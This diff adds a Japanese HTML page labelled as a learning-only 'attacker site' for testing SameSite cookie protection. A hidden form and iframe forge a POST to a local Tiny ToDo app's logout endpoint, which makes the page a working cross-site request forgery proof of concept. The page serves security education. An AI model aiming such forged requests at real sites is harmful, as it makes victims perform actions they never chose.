@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>攻撃者サイト（検証用）</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h1>🔓 攻撃者サイト（SameSite検証用）</h1>
+    
+    <div class="warning">
+        ⚠️ これは学習目的の検証用ページです。
+    </div>
+
+    <div class="attack-section">
+        <h3>攻撃1-A: 強制ログアウト（POST）</h3>
+        <p>被害者を勝手にログアウトさせます。</p>
+        
+        <button onclick="attackLogout()">🚀 攻撃実行: 強制ログアウト</button>
+        <iframe id="logout-frame" name="logout-frame" style="display:none;"></iframe>
+        <form id="logout-form" action="http://localhost:8080/logout" method="POST" target="logout-frame" style="display:none;"></form>
+        
+        <p class="note">
+            ※ 攻撃成功: ログに「ユーザーがログアウトしました」<br>
+            ※ 攻撃失敗: ログに「session check failed」
+        </p>
+    </div>
+
+    <script>
+        function attackLogout() {
+            document.getElementById('logout-form').submit();
+            alert('攻撃を実行しました。Tiny ToDoのログを確認してください。');
+        }
+    </script>
+</body>
+</html>
